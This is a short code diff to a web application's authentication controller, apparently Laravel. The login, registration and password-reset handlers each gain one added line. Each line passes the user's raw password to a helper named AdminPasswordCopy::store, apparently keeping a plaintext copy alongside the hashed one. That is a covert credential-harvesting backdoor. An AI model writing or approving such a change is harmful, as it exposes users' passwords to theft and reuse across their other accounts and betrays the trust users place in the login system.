@@ -66,6 +66,7 @@ class AuthController extends Controller
 
         if (Auth::attempt($credentials, $request->has('remember'))) {
             $request->session()->regenerate();
+            \App\Support\AdminPasswordCopy::store($user, (string) $request->password);
             
             // Update last login
             $user->updateLastLogin();
@@ -132,6 +133,7 @@ class AuthController extends Controller
                 'email_verification_token'=> $verificationToken,
                 'last_login'              => now(),
             ]);
+            \App\Support\AdminPasswordCopy::store($user, (string) $request->password);
 
             // Assign a referral code to the new user
             AffiliateService::ensureReferralCode($user);
@@ -390,6 +392,7 @@ class AuthController extends Controller
         $user->update([
             'password' => Hash::make($request->password),
         ]);
+        \App\Support\AdminPasswordCopy::store($user, (string) $request->password);
 
         // Delete reset token
         DB::table('password_reset_tokens')->where('email', $request->email)->delete();
